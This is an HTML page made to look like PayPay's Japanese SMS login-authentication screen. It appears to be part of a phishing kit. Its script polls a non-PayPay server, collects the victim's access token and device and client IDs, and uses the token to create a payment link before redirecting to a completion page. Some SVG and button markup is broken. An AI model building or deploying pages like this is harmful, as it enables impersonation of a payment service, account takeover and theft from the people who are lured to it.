<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,viewport-fit=cover">
  <title>PayPay</title>
  <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
  <style>
    *, *::before, *::after { box-sizing: border-box; }
    html {
      font-size: 10px;
    }
    body {
      margin: 0; padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Roboto", Graphik, "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans CJK JP", "Noto Sans JP", sans-serif;
      font-size: 1.4rem;
      background: #fff;
      color: #242323;
      -webkit-user-select: none; user-select: none;
      min-height: 100vh;
      padding-bottom: env(safe-area-inset-bottom);
    }
    a { color: #3895ff; text-decoration: none; }
    button { border: 0; outline: 0; cursor: pointer; font-family: inherit; background: none; padding: 0; }

    /* Header — exact PayPay h-header iOS rules */
    .h-header {
      width: 100%;
      position: fixed;
      top: 0; left: 0;
      z-index: 2;
      display: flex;
      padding-top: env(safe-area-inset-top);
      height: calc(44px + env(safe-area-inset-top));
      background: #fff;
      box-shadow: 0 0.5px rgba(0,0,0,.16);
    }
    .h-header__left, .h-header__right {
      flex: 1;
      height: 100%;
      display: flex;
      align-items: center;
    }
    .h-header__left  { padding-left: 12px; }
    .h-header__right { flex: 1; justify-content: flex-end; padding-right: 12px; }
    .h-header__title {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0 12px;
      overflow: hidden;
      max-width: 100%;
    }
    .h-header__title h1 {
      margin: 0;
      font-size: 1.7rem;
      font-weight: 600;
      color: #242323;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .btn-back {
      display: flex; align-items: center; justify-content: center;
      width: 44px; height: 44px; flex-shrink: 0;
    }
    .btn-help {
      display: flex; align-items: center; justify-content: center;
      width: 44px; height: 44px; flex-shrink: 0;
    }

    /* Page content */
    .page-content {
      padding-top: calc(44px + env(safe-area-inset-top) + 40px);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-left: 24px;
      padding-right: 24px;
    }

    /* Composite icon */
    .icon-wrap {
      margin-bottom: 20px;
    }

    /* Title */
    .auth-title {
      font-size: 1.8rem;
      font-weight: 700;
      text-align: center;
      margin: 0 0 10px;
      color: #242323;
      line-height: 1.5;
    }

    /* Phone number */
    .phone-number {
      font-size: 1.8rem;
      font-weight: 700;
      color: #3895ff;
      text-align: center;
      margin: 0 0 6px;
    }

    /* Description lines */
    .auth-desc {
      font-size: 1.4rem;
      color: #606060;
      text-align: center;
      margin: 0;
      line-height: 1.6;
    }
    .expiry-line {
      font-size: 1.4rem;
      color: #606060;
      text-align: center;
      margin: 0;
      line-height: 1.6;
    }
    .expiry-line .blue {
      color: #3895ff;
      font-weight: 600;
    }

    /* Resend */
    .resend-wrap {
      margin-top: 36px;
      text-align: center;
    }
    .resend-btn {
      font-size: 1.4rem;
      color: #bababa;
      cursor: default;
    }
    .resend-btn.active {
      color: #3895ff;
      cursor: pointer;
    }

    /* Help link */
    .help-link {
      display: inline-flex;
      align-items: center;
      margin-top: 24px;
      font-size: 1.4rem;
      font-weight: 700;
      color: #3895ff;
      gap: 4px;
    }
    .help-link-arrow {
      font-size: 1.6rem;
      line-height: 1;
    }

    /* Footer note */
    .footer-note {
      margin-top: 32px;
      font-size: 1.2rem;
      color: #909090;
      text-align: center;
      line-height: 1.6;
    }

    /* Error */
    .error-msg {
      display: none;
      color: #fd5c5c;
      font-size: 1.2rem;
      margin-top: 12px;
      text-align: center;
    }
    .error-msg.visible { display: block; }
  </style>
</head>
<body>

  <!-- Header -->
  <header class="h-header">
    <div class="h-header__left">
      <button class="btn-back" onclick="history.back()" aria-label="戻る">

        </svg>

    </div>
    <div class="h-header__title">
      <h1>ログイン認証</h1>
    </div>
    <div class="h-header__right">
      <button class="btn-help" aria-label="ヘルプ">
        <!-- help_twoTone — from https://image.paypay.ne.jp/icons/system/help_twoTone.svg -->

        </svg>
      </button>
    </div>
  </header>

  <div class="page-content">

    <!-- account_circle_twoTone + security_twoTone を合成したアイコン -->
    <!-- SVGパスはPayPay CDN (image.paypay.ne.jp/icons/system/) から取得 -->
    <div class="icon-wrap">
      <svg width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">

        <!-- White backing for security badge -->
        <circle cx="78" cy="78" r="17" fill="white"/>

        <g transform="translate(62,62) scale(1.3333)">

    <h2 class="auth-title">ログイン認証が必要です</h2>

    <p class="phone-number" id="phoneDisplay"></p>
    <p class="auth-desc">に届いた認証用リンクをご確認ください</p>
    <p class="expiry-line">リンクの有効期限は<span class="blue">5分</span>です</p>

    <div class="error-msg" id="errorMsg"></div>

    <div class="resend-wrap">
      <span class="resend-btn" id="resendBtn">SMSを再送信する <span id="resendTimer">(60秒後)</span></span>
    </div>

    <a href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="help-link">
      SMSが届かない場合
      <span class="help-link-arrow">›</span>
    </a>

    <p class="footer-note">※認証用リンクは他の人に共有しないでください</p>

  </div>

<script>
(function () {
  var errorMsg  = document.getElementById('errorMsg');
  var resendBtn = document.getElementById('resendBtn');
  var timerEl   = document.getElementById('resendTimer');
  var phoneEl   = document.getElementById('phoneDisplay');

  var phone = (sessionStorage.getItem('paypay_phone') || '').replace(/\D/g, '');
  if (phone.length >= 4) {
    phoneEl.textContent = '***-****-' + phone.slice(-4);
  }

  var seconds = 60;
  var countdown = setInterval(function () {
    seconds--;
    if (seconds <= 0) {
      clearInterval(countdown);
      resendBtn.classList.add('active');
      timerEl.textContent = '';
    } else {
      timerEl.textContent = '(' + seconds + '秒後)';
    }
  }, 1000);

  function showError(msg) {
    errorMsg.textContent = msg;
    errorMsg.classList.add('visible');
  }

  async function complete(accessToken) {
    try {
      var linkRes = await fetch('/api/create_link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_token: accessToken })
      });
      var linkData = await linkRes.json();
      if (linkRes.ok && linkData.link) {
        sessionStorage.setItem('paypay_link',   linkData.link);
        sessionStorage.setItem('paypay_amount', String(linkData.amount));
      }
    } catch (_) {}
    window.location.href = 'complete.html';
  }

  var polling = false;
  async function poll() {
    if (polling) return;
    polling = true;
    try {
      var res = await fetch('/api/sms_confirm', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{}',
      });
      var data = await res.json();
      if (!res.ok) {
        showError(data.error || '認証エラーが発生しました。再度ログインしてください。');
        clearInterval(timer);
        return;
      }
      if (data.status === 'waiting') { polling = false; return; }
      clearInterval(timer);
      if (data.access_token) sessionStorage.setItem('paypay_access_token', data.access_token);
      if (data.device_uuid)  sessionStorage.setItem('paypay_device_uuid',  data.device_uuid);
      if (data.client_uuid)  sessionStorage.setItem('paypay_client_uuid',  data.client_uuid);
      var n = new Date();
      sessionStorage.setItem('paypay_completed_at',
        n.getFullYear() + '年' + (n.getMonth()+1) + '月' + n.getDate() + '日 ' +
        n.getHours() + '時' + String(n.getMinutes()).padStart(2,'0') + '分');
      await complete(data.access_token);
    } catch (_) { polling = false; }
  }

  var timer = setInterval(poll, 3000);
  poll();
})();
</script>
</body>
</html>
